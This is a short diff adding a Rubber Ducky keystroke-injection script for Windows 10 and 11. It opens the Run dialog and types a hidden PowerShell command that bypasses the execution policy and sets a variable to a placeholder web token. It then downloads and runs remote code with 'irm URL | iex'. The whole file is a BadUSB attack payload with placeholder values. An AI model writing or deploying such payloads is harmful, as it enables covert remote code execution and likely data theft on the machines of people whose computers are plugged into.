@@ -1,0 +1,9 @@
+REM Add ducky script
+
+REM Mode: HID
+REM Target: Windows 10, 11
+
+GUI r
+DELAY 300
+STRING powershell -w h -NoP -Ep Bypass $dc'insert web token here'; irm URL | iex
+ENTER
